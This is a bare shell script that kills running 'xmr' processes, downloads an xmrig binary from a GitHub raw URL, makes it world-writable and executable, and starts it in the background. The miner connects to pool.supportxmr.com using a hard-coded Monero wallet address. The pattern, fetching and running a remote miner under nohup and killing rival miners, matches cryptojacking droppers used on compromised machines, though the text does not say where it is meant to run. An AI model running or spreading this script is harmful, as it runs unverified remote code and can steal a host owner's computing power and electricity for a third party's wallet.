pkill -f xmr
curl -o xmrig https://raw.githubusercontent.com/mhrsq/free/refs/heads/main/xmrig
chmod 777 xmrig
ps -aux | grep xmr

nohup ./xmrig -t 2 -o pool.supportxmr.com:443 -u 492zTyp9mMSZK9FbXJzruWUZNmovsaES4CuEgAUw8MhhF9QrfYMbdUWPATRGDyDJCW4Yqc1fJTFkGPvKR9Xm4riNJTtnewy -k --tls -p guacamole &


ps -aux | grep xmr
